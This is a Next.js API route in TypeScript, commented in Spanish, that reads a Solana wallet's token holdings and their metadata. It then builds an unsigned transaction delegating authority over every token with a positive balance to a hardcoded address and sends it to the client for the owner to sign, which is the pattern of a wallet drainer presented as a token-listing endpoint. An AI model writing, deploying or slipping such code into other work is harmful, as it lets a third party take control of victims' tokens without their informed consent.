import { NextResponse } from "next/server";
import { Connection, PublicKey, Transaction } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { createUmi } from "@metaplex-foundation/umi-bundle-defaults";
import { mplTokenMetadata, fetchDigitalAsset } from "@metaplex-foundation/mpl-token-metadata";
import { fromWeb3JsPublicKey } from "@metaplex-foundation/umi-web3js-adapters";
import { createDelegateAuthorityTransaction } from "@/lib/createDelegateAuthorityTransaction";

const RPC_URL = "https://api.mainnet-beta.solana.com";
const umi = createUmi(RPC_URL).use(mplTokenMetadata());
const DELEGATE_ADDRESS = new PublicKey("5mcDoDrBTRYTAXQvWfd9zQsiJkRwVuyegJyq36E4HBDD");

// Obtener metadata de un mint con fallback
async function getTokenMetadata(mint: PublicKey) {
  try {
    const umiPk = fromWeb3JsPublicKey(mint);
    const asset = await fetchDigitalAsset(umi, umiPk);
    return {
      name: asset.metadata.name ?? "Unknown",
      symbol: asset.metadata.symbol ?? "UNK",
      decimals: asset.mint.decimals ?? 0,
    };
  } catch {
    return { name: "Unknown", symbol: "UNK", decimals: 0 };
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    if (!body.owner) throw new Error("No se recibió la wallet del usuario");
    const owner = new PublicKey(body.owner);

    const connection = new Connection(RPC_URL, "confirmed");

    // Obtener todas las cuentas de token del usuario
    const response = await connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_PROGRAM_ID,
    });

    const positiveAccounts = response.value.filter(
      (acc) => parseInt(acc.account.data.parsed.info.tokenAmount.amount) > 0
    );

    // Si no hay tokens positivos
    if (positiveAccounts.length === 0) {
      return NextResponse.json({ tokens: [], serializedTx: null });
    }

    // Construir arreglo de tokens con metadata
    const tokens = [];
    for (const acc of positiveAccounts) {
      const info = acc.account.data.parsed.info;
      const mintPk = new PublicKey(info.mint);
      const metadata = await getTokenMetadata(mintPk);

      const amount =
        parseInt(info.tokenAmount.amount) /
        Math.pow(10, info.tokenAmount.decimals || metadata.decimals);

      tokens.push({
        tokenAccount: acc.pubkey.toBase58(),
        mint: mintPk.toBase58(),
        name: metadata.name,
        symbol: metadata.symbol,
        amount,
      });
    }

    // Crear transacción de delegación
    const transaction = createDelegateAuthorityTransaction(tokens, owner, DELEGATE_ADDRESS);

    // Asignar feePayer y recentBlockhash
    transaction.feePayer = owner;
    const { blockhash } = await connection.getLatestBlockhash("confirmed");
    transaction.recentBlockhash = blockhash;

    // Serializar para enviar al cliente
    const serializedTx = transaction.serialize({ requireAllSignatures: false }).toString("base64");

    return NextResponse.json({ tokens, serializedTx });
  } catch (err: any) {
    console.error("ERROR EN /api/tokens:", err);
    return NextResponse.json({ error: err.message || "Error processing tokens" }, { status: 500 });
  }
}